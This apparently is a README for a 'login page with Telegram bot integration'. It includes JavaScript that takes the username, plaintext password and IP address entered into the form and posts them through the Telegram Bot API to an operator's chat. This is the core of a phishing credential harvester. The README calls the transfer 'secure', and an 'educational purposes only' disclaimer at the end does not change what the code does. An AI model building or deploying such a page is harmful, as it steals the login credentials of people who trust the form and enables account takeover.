🔐 Login Page with Telegram Bot Integration

This project is a login page that sends user information to a Telegram bot after successful authentication.

✨ Features

✅ Simple and responsive login form
✅ Sends user information (like username and IP address) to a Telegram bot
✅ Uses fetch API for secure data transmission

🛠️ Technologies Used

🚀 HTML, CSS, JavaScript
🔗 fetch API for sending data
🤖 Telegram Bot API

⚙️ How It Works

1️⃣ The user enters their login details and submits the form.
2️⃣ The script sends the login data to the Telegram bot using the bot API.
3️⃣ The Telegram bot receives and forwards the user information to a specified chat.

📌 Setup

1️⃣ Create a Telegram Bot

Go to 🤖 BotFather on Telegram.

Create a new bot and get the Bot Token.

Get your Chat ID (Use ℹ️ @userinfobot to find it).


2️⃣ Configure Your Project

Open the JavaScript file and replace BOT_TOKEN and CHAT_ID with your actual values:


const botToken = "YOUR_BOT_TOKEN";  
const chatId = "YOUR_CHAT_ID";  

const sendToTelegram = (username, password, ip) => {  
    const message = `🔐 New Login:\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}`;  
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
        method: "POST",  
        headers: { "Content-Type": "application/json" },  
        body: JSON.stringify({ chat_id: chatId, text: message })  
    });  
};

3️⃣ Run the Project

▶️ Open index.html in a browser.
▶️ Enter login details and check your Telegram bot for updates.

⚠️ Disclaimer

🚨 This project is for educational purposes only. Do not use it for unauthorized activities.

